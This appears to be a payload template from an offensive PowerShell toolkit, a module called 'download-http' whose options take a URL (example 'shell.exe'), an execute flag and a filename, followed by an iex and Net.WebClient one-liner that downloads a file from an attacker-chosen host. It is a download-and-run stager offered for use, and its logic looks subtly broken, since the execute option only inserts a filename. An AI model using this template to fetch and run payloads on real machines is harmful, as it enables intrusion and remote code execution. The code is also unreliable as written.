##########
Name: download-http
Author: Jusmistic
Description: Download file from url
Options:
    url: "File's URL (Ex: http://127.0.0.1/shell.exe)"
    execute: "Execute downloaded file? (Ex. y = yes / n = no)"
    filename: "Filename to execute (Ex:shell.exe)"
##########
iex (New-Object Net.WebClient).DownloadFile('{{url}}'{% if execute %}, '{{filename}}'{% endif %});
